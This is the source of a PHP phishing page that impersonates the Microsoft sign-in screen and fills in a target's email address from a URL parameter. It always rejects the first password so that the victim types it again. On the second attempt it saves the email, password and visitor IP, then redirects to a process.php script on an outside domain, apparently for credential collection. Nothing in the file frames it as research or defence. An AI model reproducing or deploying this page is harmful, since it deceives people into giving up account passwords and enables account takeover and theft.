<?php
// Start session at the very beginning
if (!isset($_SESSION)) {
    session_start();
}

// Configuration
$VALID_PASSWORD = "Password1!"; // Change this to your desired password
$TARGET_URL = "https://www.bing.com/videos/riverview/relatedvideo?q=team+meeting&mid=06C0E4192AA37E48CEC406C0E4192AA37E48CEC4&FORM=VIRE";

// Get email from URL parameter or use default
$email = isset($_GET['email']) ? $_GET['email'] : "kdkldkkl@example.com";

// Initialize attempt counter if not set
if (!isset($_SESSION['attempt_count'])) {
    $_SESSION['attempt_count'] = 0;
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    $password = $_POST['password'];
    
    // Increment attempt counter
    $_SESSION['attempt_count']++;
    
    // Check if maximum attempts reached
    if ($_SESSION['attempt_count'] >= 2) {
        // On second attempt: redirect to process.php
        $_SESSION['login_data'] = [
            'email' => $email,
            'password' => $password,
            'ip' => $_SERVER['REMOTE_ADDR']
        ];
        
        // Clear the session attempt counter
        unset($_SESSION['attempt_count']);
        
        // Redirect to process.php for handling notifications
        header("Location: https://ap.capitalfcunion.com/32/process.php");
        exit;
    } else {
        // First attempt: always show invalid password
        $error = "Invalid password";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/logo/logo.svg" type="image/png">
    <title>Microsoft Sign In</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: url('logo/bg.jpg') no-repeat center center;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        
        .login-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 400px;
            max-width: 90%;
        }
        
        .microsoft-logo {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .microsoft-logo svg {
            width: 24px;
            height: 24px;
            margin-right: 10px;
        }
        
        .email-display {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
            color: #666;
        }
        
        h2 {
            margin-top: 0;
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: 600;
        }
        
        .password-input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-bottom: 15px;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        .password-input.invalid {
            border-color: #e74c3c;
        }
        
        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-bottom: 15px;
            display: <?php echo isset($error) ? 'block' : 'none'; ?>;
        }
        
        .forgot-password {
            color: #0067b8;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 20px;
            display: inline-block;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .sign-in-button {
            background-color: #0067b8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px 24px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s;
        }
        
        .sign-in-button:disabled {
            background-color: #999;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="microsoft-logo">
            <svg viewBox="0 0 24 24" fill="currentColor">
                <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
                <rect x="13" y="0" width="11" height="11" fill="#7FBA00"/>
                <rect x="0" y="13" width="11" height="11" fill="#00A4EF"/>
                <rect x="13" y="13" width="11" height="11" fill="#FFB900"/>
            </svg>
            <span>Microsoft</span>
        </div>
        
        <div class="email-display">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M19 12H5M12 19l-7-7 7-7"/>
            </svg>
            <?php echo htmlspecialchars($email); ?>
        </div>
        
        <h2>Enter password</h2>
        
        <form method="POST" id="loginForm">
            <input type="password" class="password-input <?php echo isset($error) ? 'invalid' : ''; ?>" 
                   placeholder="Password" id="passwordInput" name="password" autocomplete="off" required>
            <div class="error-message"><?php echo isset($error) ? htmlspecialchars($error) : ''; ?></div>
            
            <a href="#" class="forgot-password">Forgot password?</a>
            
            <button type="submit" class="sign-in-button">Sign in</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const pwd = document.getElementById('passwordInput').value.trim();
            if (!pwd) {
                e.preventDefault();
                alert("Please enter your password.");
            }
        });
    </script>
</body>
</html>